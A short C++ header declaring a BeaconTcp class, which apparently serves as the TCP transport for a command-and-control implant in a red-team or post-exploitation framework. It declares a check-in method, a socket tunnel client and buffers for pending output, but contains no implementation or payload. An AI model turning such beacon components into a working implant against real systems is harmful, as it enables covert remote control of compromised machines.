#pragma once

#include "Beacon.hpp"
#include "../TcpFrameBuffer.hpp"

class SocketTunnelClient;


class BeaconTcp : public Beacon
{

public:
    BeaconTcp(std::string& config, std::string& ip, int port);
    ~BeaconTcp();

protected:
    void checkIn() override;

private:
    std::string m_ip;
    int m_port;

    SocketTunnelClient* m_client;
    std::string m_pendingOutput;
    TcpFrameBuffer m_frames;
};
